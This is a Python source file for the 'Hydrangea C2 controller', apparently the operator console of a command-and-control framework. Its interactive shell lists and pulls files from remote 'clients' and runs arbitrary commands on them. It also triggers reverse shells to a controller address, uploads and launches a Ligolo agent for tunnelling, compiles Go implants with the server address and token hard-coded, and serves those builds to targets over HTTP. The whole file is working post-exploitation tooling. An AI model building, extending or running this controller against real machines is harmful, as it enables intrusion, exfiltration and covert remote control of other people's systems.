#!/usr/bin/env python3

import argparse
import asyncio
import hashlib
import http.server
import json
import os
import shlex
import socket
import ssl
import subprocess
import threading
from datetime import datetime
from typing import Any

from .utils.common import read_frame, write_frame
from .utils.controller_ui import (
    UI,
    print_clients,
    print_error,
    print_exec,
    print_list,
    print_queued,
    print_server_config,
    print_server_health,
    print_session,
)
from .utils.go_builder import build_go_clients

__version__ = "4.0"


# ---------- wire ----------
async def admin_send(
    host: str,
    port: int,
    auth_token: str,
    header: dict,
    payload: bytes = b"",
    tls: bool = False,
    tls_fingerprint: str = "",
):
    if tls:
        ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE  # fingerprint checked manually below
        reader, writer = await asyncio.open_connection(host, port, ssl=ssl_ctx)
        if tls_fingerprint:
            ssl_obj = writer.get_extra_info("ssl_object")
            der = ssl_obj.getpeercert(binary_form=True)
            actual = hashlib.sha256(der).hexdigest()
            expected = tls_fingerprint.lower().replace(":", "")
            if actual != expected:
                writer.close()
                await writer.wait_closed()
                raise ConnectionError(
                    f"TLS fingerprint mismatch\n  got:  {actual}\n  want: {expected}"
                )
    else:
        reader, writer = await asyncio.open_connection(host, port)
    admin_header = {"type": "ADMIN", "token": auth_token}
    admin_header.update(header)
    await write_frame(writer, admin_header, payload)
    resp, resp_payload = await read_frame(reader)
    writer.close()
    await writer.wait_closed()
    return resp, resp_payload


def _get_local_ips() -> list[str]:
    """Return all non-loopback IPv4 addresses on this machine."""
    ips: set[str] = set()
    try:
        for _, _, _, _, sockaddr in socket.getaddrinfo(socket.gethostname(), None):
            ip = sockaddr[0]
            if not ip.startswith("127.") and ":" not in ip:
                ips.add(ip)
    except Exception:
        pass
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            ips.add(s.getsockname()[0])
    except Exception:
        pass
    return sorted(ips) or ["<your-ip>"]


class _SilentFileHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):  # noqa: A002
        pass


class NoExitArgumentParser(argparse.ArgumentParser):
    def error(self, message):  # don't sys.exit; raise for REPL handling
        raise ValueError(message)


def build_repl_parser() -> tuple[argparse.ArgumentParser, dict[str, argparse.ArgumentParser]]:
    p = NoExitArgumentParser(prog=">>")
    sub = p.add_subparsers(dest="cmd")

    # context commands
    sp = sub.add_parser("use", help="Set the active client for subsequent commands")
    sp.add_argument("client", help="Client ID to use")

    sp = sub.add_parser("unuse", help="Clear the active client (or only if it matches)")
    sp.add_argument("client", nargs="?", help="Optional client ID to unuse (must match current)")

    # regular commands (client optional in REPL; will use active context)
    sub.add_parser("clients", help="List connected clients")

    sp = sub.add_parser("ping", help="Ping a client and display round-trip time")
    sp.add_argument("--client", required=False)
    sp.add_argument(
        "--timeout", type=float, default=5.0, help="Seconds to wait for PONG (default: 5)"
    )

    sp = sub.add_parser("list", help="List directory on client")
    sp.add_argument("--client", required=False)
    sp.add_argument("--path", default=".")
    sp.add_argument(
        "--no-wait", action="store_true", help="Queue the order without waiting for result"
    )
    sp.add_argument(
        "--timeout", type=float, default=10.0, help="Seconds to wait for result (default: 10)"
    )

    sp = sub.add_parser("ls", help="List directory on client")
    sp.add_argument("--client", required=False)
    sp.add_argument("--path", default=".")
    sp.add_argument(
        "--no-wait", action="store_true", help="Queue the order without waiting for result"
    )
    sp.add_argument(
        "--timeout", type=float, default=10.0, help="Seconds to wait for result (default: 10)"
    )

    sp = sub.add_parser("pull", help="Pull a file from client to server")
    sp.add_argument("--client", required=False)
    sp.add_argument("--src", required=True)
    sp.add_argument("--dest", required=True)

    sp = sub.add_parser("push", help="Push a local file to client")
    sp.add_argument("--client", required=False)
    sp.add_argument("--src", required=True, help="Local path to send")
    sp.add_argument("--dest", required=True, help="Destination path on client")

    sp = sub.add_parser("exec", help="Execute a command on the client")
    sp.add_argument("--client", required=False)
    sp.add_argument(
        "--command",
        required=True,
        help='Command string or JSON list (e.g. "[\\"ls\\",\\"-la\\"]")',
    )
    sp.add_argument("--shell", action="store_true", help="Run via shell")
    sp.add_argument("--cwd", help="Working directory on client")
    sp.add_argument("--timeout", type=float, default=30.0, help="Seconds to wait for command")

    sp = sub.add_parser("session", help="Fetch session info from client")
    sp.add_argument("--client", required=False)
    sp.add_argument("--timeout", type=float, default=10.0)

    # build-client (REPL)
    sp = sub.add_parser(
        "build-client",
        help="Compile Go clients from ./client/go with hard-coded server details",
    )
    sp.add_argument("--server-host", default=None)
    sp.add_argument("--server-port", type=int, default=None)
    sp.add_argument("--build-auth-token", default=None)
    sp.add_argument("--client-id", default=None)
    sp.add_argument("--out", default="./dist")
    sp.add_argument("--os", action="append", choices=["linux", "windows"])
    sp.add_argument("--arch", default="amd64", choices=["amd64", "arm64"])
    sp.add_argument("--agent-path", default="", help="Path to custom agent source")
    sp.add_argument("--build-tls", action="store_true", help="Bake TLS=true into the client binary")
    sp.add_argument(
        "--build-tls-fingerprint",
        default="",
        metavar="HEX",
        help="Bake TLS fingerprint into the client binary (implies --build-tls)",
    )

    sp = sub.add_parser(
        "serve-files",
        help="Start an HTTP file server to share build artifacts with a target",
    )
    sp.add_argument("--path", required=True, help="Directory to serve")
    sp.add_argument("--port", type=int, default=8888, help="Port to listen on (default: 8888)")
    sp.add_argument(
        "--interface", default="0.0.0.0", help="Interface to bind to (default: 0.0.0.0)"
    )

    sub.add_parser("stop-serve", help="Stop the running HTTP file server")

    # server-status (REPL)
    sub.add_parser("server-status", help="Check the server's health status")

    # meta
    sub.add_parser("help", help="Show help or 'help <command>'")
    sub.add_parser("quit", help="Exit the console")
    sub.add_parser("exit", help="Exit the console")

    # reverse-shell (REPL)
    sp = sub.add_parser("reverse-shell", help="Start a reverse shell to the controller")
    sp.add_argument("controller_addr", help="Controller address (host:port)")
    sp.add_argument("--client", required=False)

    # port-forward (REPL)
    sp = sub.add_parser(
        "port-forward",
        help="Upload and run Ligolo agent for port forwarding",
    )
    sp.add_argument("--ligolo-path", required=True, help="Path to Ligolo agent binary")
    sp.add_argument(
        "--connect-args",
        required=True,
        help="Arguments passed after --connect, e.g. '127.0.0.1:1000 -slefcert'",
    )
    sp.add_argument("--client", required=False)

    sp = sub.add_parser("server-exec", help="Run a shell command on the server host")
    sp.add_argument("--command", required=True, help="Command to run on the server machine")
    sp.add_argument("--timeout", type=float, default=30.0, help="Seconds to wait (default: 30)")

    sp = sub.add_parser("add-agent-token", help="Register a new agent auth token on the server")
    sp.add_argument("--token", required=True, help="Token to register")
    sp.add_argument(
        "--port",
        type=int,
        default=None,
        help="Bind token exclusively to this agent port (default: add to global set)",
    )

    sp = sub.add_parser("add-agent-port", help="Open a new agent listening port on the server")
    sp.add_argument("--port", type=int, required=True, help="Port number to open")
    sp.add_argument(
        "--token",
        default=None,
        help="Bind a token exclusively to this port (optional; uses global tokens if omitted)",
    )

    sp = sub.add_parser("remove-agent-token", help="Remove an agent auth token from the server")
    sp.add_argument("--token", required=True, help="Token to remove")
    sp.add_argument(
        "--port",
        type=int,
        default=None,
        help="Remove from port-exclusive set (default: remove from global set)",
    )

    sp = sub.add_parser("remove-agent-port", help="Close an agent listening port on the server")
    sp.add_argument("--port", type=int, required=True, help="Port to close")

    sub.add_parser("server-config", help="Show server port and token configuration")

    sp = sub.add_parser("local", help="Run a local shell command")
    sp.add_argument("local_command", help="Local command to run")

    # Return also a mapping for subparser lookups (for help display)
    return p, {sp_prog(p): p for p in sub._name_parser_map.values()}


def sp_prog(p: argparse.ArgumentParser) -> str:
    # Retrieve the subparser's program name (command) robustly
    # argparse stores it in .prog; last token is the subcommand
    return p.prog.split()[-1]


# ---------- REPL loop ----------
async def run_repl(args) -> None:
    repl_parser, sub_map = build_repl_parser()
    commands = sorted(k for k in sub_map.keys() if k not in {"help"})
    commands += ["help", "quit", "exit"]

    ui = UI(
        use_color=(not args.no_color),
        show_banner=(not args.no_banner),
        quiet=False,
        commands=commands,
    )
    ui.welcome(__version__, args.host, args.port)

    current_client: str | None = None
    session_start = datetime.now()
    command_count = 0
    _file_server: http.server.HTTPServer | None = None

    # Pre-configure TLS once for the whole session
    _tls = getattr(args, "tls", False)
    _tls_fp = getattr(args, "tls_fingerprint", "") or ""

    async def _send(header: dict, payload: bytes = b"") -> tuple[dict[str, Any], bytes]:
        """Thin wrapper that forwards TLS settings to every admin_send call."""
        try:
            return await admin_send(
                args.host,
                args.port,
                args.auth_token,
                header,
                payload,
                tls=_tls,
                tls_fingerprint=_tls_fp,
            )
        except (OSError, ConnectionError) as e:
            ui.error(f"Cannot reach server at {args.host}:{args.port} — {e}")
            return {"type": "ERROR", "error": str(e)}, b""

    # Verify server is reachable and token is accepted before entering the REPL.
    try:
        probe, _ = await admin_send(
            args.host,
            args.port,
            args.auth_token,
            {"action": "clients"},
            tls=_tls,
            tls_fingerprint=_tls_fp,
        )
    except (OSError, ConnectionError) as e:
        ui.error(f"Cannot connect to server at {args.host}:{args.port} — {e}")
        return
    if probe.get("type") == "ERROR":
        ui.error(f"Server rejected connection: {probe.get('error')}")
        return
    ui.update_agents([c["id"] for c in probe.get("clients", [])])

    while True:
        try:
            line = await ui.prompt(current_client)
        except (EOFError, KeyboardInterrupt):
            if await ui.confirm_exit():
                ui.goodbye(command_count, session_start)
                return
            continue

        if not line or line.startswith("#"):
            continue

        # ---- built-in keywords handled before argparse ----
        if line.lower() in {"help", "?"}:
            ui.help_menu(sub_map)
            continue

        if line.lower().startswith("help "):
            _, _, target_cmd = line.partition(" ")
            sp = sub_map.get(target_cmd.strip())
            if not sp:
                ui.error(f"Unknown command: {target_cmd.strip()}")
            else:
                ui.command_help(target_cmd.strip(), sp)
            continue

        if line.lower() in {"quit", "exit", "ciao", "bisous"}:
            if await ui.confirm_exit():
                ui.goodbye(command_count, session_start)
                return
            continue

        command_count += 1

        # ---- argparse dispatch ----
        try:
            ns = repl_parser.parse_args(shlex.split(line))
        except ValueError as e:
            ui.error(str(e))
            continue
        except SystemExit:
            continue

        cmd = getattr(ns, "cmd", None)
        if not cmd:
            ui.error("No command parsed. Type 'help'.")
            continue

        def _resolve_client(flag_value: str | None) -> str | None:
            return flag_value or current_client

        # ---- context ----
        if cmd == "use":
            prev = current_client
            current_client = ns.client.strip()
            ui.show_client_switch(prev, current_client)
            continue

        if cmd == "unuse":
            if ns.client and current_client and ns.client != current_client:
                ui.info(
                    f"Active client is {ui.c(current_client, 'cyan')}; "
                    f"did not clear {ui.c(ns.client, 'dim')}"
                )
                continue
            ui.show_client_clear(current_client)
            current_client = None
            continue

        # ---- fleet ----
        if cmd == "clients":
            resp, _ = await _send({"action": "clients"})
            if resp.get("type") == "CLIENTS":
                client_list = resp.get("clients", [])
                print_clients(ui, client_list)
                ui.update_agents([c["id"] for c in client_list])
            else:
                print_error(ui, resp)
            continue

        if cmd == "ping":
            target = _resolve_client(ns.client)
            if not target:
                ui.show_no_client_error()
                continue
            resp, _ = await _send({"action": "ping", "target_id": target, "timeout": ns.timeout})
            if resp.get("type") == "PONG":
                rtt = resp.get("rtt_ms", "?")
                ui.success(f"Pong from {ui.c(target, 'cyan')}  ({rtt} ms)")
            else:
                print_error(ui, resp)
            continue

        # ---- files ----
        if cmd == "list" or cmd == "ls":
            target = _resolve_client(ns.client)
            if not target:
                ui.show_no_client_error()
                continue
            wait = not ns.no_wait
            resp, payload = await _send(
                {
                    "action": "list",
                    "target_id": target,
                    "path": ns.path,
                    "wait": wait,
                    "timeout": ns.timeout,
                }
            )
            if wait:
                print_list(ui, ns.path, resp, payload)
            else:
                print_queued(ui, resp)
            continue

        if cmd == "pull":
            target = _resolve_client(ns.client)
            if not target:
                ui.show_no_client_error()
                continue
            resp, _ = await _send(
                {
                    "action": "pull",
                    "target_id": target,
                    "src": ns.src,
                    "dest": ns.dest,
                }
            )
            if resp.get("type") == "QUEUED":
                print_queued(ui, resp)
                ui.info("File will arrive in server storage once the client responds.")
            else:
                print_error(ui, resp)
            continue

        if cmd == "push":
            target = _resolve_client(ns.client)
            if not target:
                ui.show_no_client_error()
                continue
            if not os.path.isfile(ns.src):
                ui.error(f"Local file not found: {ns.src}")
                continue
            try:
                with open(ns.src, "rb") as f:
                    data = f.read()
            except Exception as e:
                ui.error(f"Cannot read {ns.src}: {e}")
                continue
            resp, _ = await _send(
                {
                    "action": "push",
                    "target_id": target,
                    "dest": ns.dest,
                    "src_name": os.path.basename(ns.src),
                },
                data,
            )
            if resp.get("type") == "QUEUED":
                print_queued(ui, resp)
            else:
                print_error(ui, resp)
            continue

        # ---- execution ----
        if cmd == "exec":
            target = _resolve_client(ns.client)
            if not target:
                ui.show_no_client_error()
                continue
            cmd_value = ns.command
            try:
                cmd_value = json.loads(cmd_value)
            except Exception:
                pass
            resp, payload = await _send(
                {
                    "action": "exec",
                    "target_id": target,
                    "cmd": cmd_value,
                    "shell": ns.shell,
                    "cwd": ns.cwd,
                    "timeout": ns.timeout,
                }
            )
            print_exec(ui, target, resp, payload)
            continue

        if cmd == "session":
            target = _resolve_client(ns.client)
            if not target:
                ui.show_no_client_error()
                continue
            resp, payload = await _send(
                {
                    "action": "session_info",
                    "target_id": target,
                    "timeout": ns.timeout,
                }
            )
            print_session(ui, target, resp, payload)
            continue

        if cmd == "reverse-shell":
            target = _resolve_client(getattr(ns, "client", None))
            if not target:
                ui.show_no_client_error()
                continue
            ui.info(
                f"Start your listener on {ui.c(ns.controller_addr, 'cyan')} "
                f"before sending — client dials immediately."
            )
            resp, _ = await _send(
                {
                    "action": "reverse_shell",
                    "target_id": target,
                    "controller_addr": ns.controller_addr,
                }
            )
            if resp.get("type") == "QUEUED":
                print_queued(ui, resp)
            else:
                print_error(ui, resp)
            continue

        if cmd == "port-forward":
            target = _resolve_client(getattr(ns, "client", None))
            if not target:
                ui.show_no_client_error()
                continue
            if not os.path.isfile(ns.ligolo_path):
                ui.error(f"Ligolo binary not found: {ns.ligolo_path}")
                continue
            try:
                with open(ns.ligolo_path, "rb") as f:
                    payload = f.read()
            except Exception as e:
                ui.error(f"Cannot read binary: {e}")
                continue
            filename = os.path.basename(ns.ligolo_path)
            resp, _ = await _send(
                {"action": "push", "target_id": target, "dest": filename, "src_name": filename},
                payload,
            )
            if resp.get("type") != "QUEUED":
                print_error(ui, resp)
                continue
            ui.info(f"Upload queued: {ui.c(filename, 'cyan')} -> {ui.c(target, 'cyan')}")
            resp, _ = await _send(
                {
                    "action": "port_forward",
                    "target_id": target,
                    "filename": filename,
                    "connect_args": ns.connect_args,
                }
            )
            if resp.get("type") == "QUEUED":
                print_queued(ui, resp)
            else:
                print_error(ui, resp)
            continue

        # ---- build ----
        if cmd == "build-client":
            if ns.server_host is None:
                ns.server_host = args.host
            if ns.server_port is None:
                ns.server_port = args.port
            if ns.build_auth_token is None:
                ns.build_auth_token = args.auth_token
            ui.build_summary(ns)
            try:
                build_go_clients(ui, ns, ns.agent_path)
            except Exception as e:
                ui.error(f"Build failed: {e}")
            continue

        # ---- server / local ----
        if cmd == "server-status":
            resp, _ = await _send({"action": "health_status"})
            print_server_health(ui, resp)
            continue

        if cmd == "server-exec":
            resp, payload = await _send(
                {
                    "action": "server_exec",
                    "cmd": ns.command,
                    "timeout": ns.timeout,
                }
            )
            print_exec(ui, "server", resp, payload)
            continue

        if cmd == "add-agent-token":
            resp, _ = await _send(
                {
                    "action": "add_agent_token",
                    "agent_token": ns.token,
                    "port": ns.port,
                }
            )
            if resp.get("type") == "OK":
                if resp.get("scope") == "port":
                    ui.success(
                        f"Token registered on :{resp.get('port')}  "
                        f"(that port is now exclusive to its bound tokens)"
                    )
                else:
                    ui.success("Token added to global agent token set")
            else:
                print_error(ui, resp)
            continue

        if cmd == "add-agent-port":
            resp, _ = await _send(
                {
                    "action": "add_agent_port",
                    "port": ns.port,
                    "agent_token": ns.token,
                }
            )
            if resp.get("type") == "OK":
                binding = resp.get("token_binding", "global")
                ui.success(
                    f"Agent port :{ns.port} opened  [muted]({binding} token binding)[/muted]"
                )
            else:
                print_error(ui, resp)
            continue

        if cmd == "server-config":
            resp, _ = await _send({"action": "server_config"})
            print_server_config(ui, resp)
            continue

        if cmd == "remove-agent-token":
            resp, _ = await _send(
                {
                    "action": "remove_agent_token",
                    "agent_token": ns.token,
                    "port": ns.port,
                }
            )
            if resp.get("type") == "OK":
                if resp.get("scope") == "port":
                    ui.success(f"Token removed from :{resp.get('port')} exclusive set")
                else:
                    ui.success("Token removed from global agent token set")
            else:
                print_error(ui, resp)
            continue

        if cmd == "remove-agent-port":
            if ns.port == args.port:
                ui.error(
                    f":{ns.port} is the admin port this controller is connected to. "
                    "Closing it would sever your connection. The server will reject this request."
                )
                continue
            resp, _ = await _send({"action": "remove_agent_port", "port": ns.port})
            if resp.get("type") == "OK":
                evicted = resp.get("evicted_clients", [])
                msg = f"Agent port :{ns.port} closed"
                if evicted:
                    msg += f"  [muted](evicted: {', '.join(evicted)})[/muted]"
                ui.success(msg)
            else:
                print_error(ui, resp)
            continue

        if cmd == "serve-files":
            if _file_server is not None:
                ui.error("A file server is already running. Use stop-serve first.")
                continue
            path = os.path.abspath(ns.path)
            if not os.path.isdir(path):
                ui.error(f"Directory not found: {path}")
                continue

            def _make_handler(d: str):
                def _h(*args, **kwargs):
                    return _SilentFileHandler(*args, directory=d, **kwargs)

                return _h

            try:
                srv = http.server.HTTPServer((ns.interface, ns.port), _make_handler(path))
                t = threading.Thread(target=srv.serve_forever, daemon=True)
                t.start()
                _file_server = srv
                ui.success(f"File server started  [muted](serving {path})[/muted]")
                if ns.interface == "0.0.0.0":
                    for ip in _get_local_ips():
                        ui.info(f"  http://{ip}:{ns.port}/")
                else:
                    ui.info(f"  http://{ns.interface}:{ns.port}/")
            except OSError as e:
                ui.error(f"Failed to start file server: {e}")
            continue

        if cmd == "stop-serve":
            if _file_server is None:
                ui.error("No file server is running.")
                continue
            _file_server.shutdown()
            _file_server = None
            ui.success("File server stopped.")
            continue

        if cmd == "local":
            try:
                proc = subprocess.Popen(ns.local_command, shell=True)
                ui.info(f"PID {proc.pid}  running: {ui.c(ns.local_command, 'dim')}")
                try:
                    proc.wait(timeout=300)
                    ui.success(f"exit {proc.returncode}")
                except subprocess.TimeoutExpired:
                    proc.kill()
                    ui.error("Timed out after 5 min — process killed.")
                except KeyboardInterrupt:
                    proc.terminate()
                    ui.info("Interrupted.")
            except Exception as e:
                ui.error(f"Failed to start: {e}")
            continue

        ui.error(f"Unknown command: {cmd}  (type 'help')")


# ---------- CLI ----------


async def amain():
    ap = argparse.ArgumentParser(description="Hydrangea C2 controller")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--auth-token", required=True)
    # TLS flags
    ap.add_argument("--tls", action="store_true", help="Connect to server using TLS")
    ap.add_argument(
        "--tls-fingerprint",
        default="",
        metavar="HEX",
        help="Expected SHA-256 fingerprint of the server TLS cert (hex, colons optional); implies --tls",
    )

    # UI flags
    ap.add_argument("--no-color", action="store_true", help="Disable ANSI colors")
    ap.add_argument("--no-banner", action="store_true", help="Hide ASCII banner")
    ap.add_argument("--quiet", action="store_true", help="Less chatter")
    args = ap.parse_args()

    # A fingerprint alone implies TLS.
    if args.tls_fingerprint:
        args.tls = True

    await run_repl(args)


def main() -> None:
    asyncio.run(amain())


if __name__ == "__main__":
    main()
